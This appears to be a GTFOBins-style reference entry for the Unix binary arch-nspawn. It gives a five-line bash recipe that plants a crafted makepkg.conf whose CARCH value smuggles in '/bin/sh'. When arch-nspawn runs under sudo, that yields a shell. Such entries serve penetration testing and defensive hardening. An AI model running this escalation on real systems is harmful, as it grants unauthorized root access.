---
type: gtfobin
name: arch-nspawn
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# arch-nspawn

## shell

```bash
mkdir -p ./etc/
grep -oP "^CHROOT_VERSION='\K[^']+" /usr/share/devtools/lib/archroot.sh >.arch-chroot
touch ./etc/pacman.conf
echo 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf
arch-nspawn .
```
**Contexts:** sudo
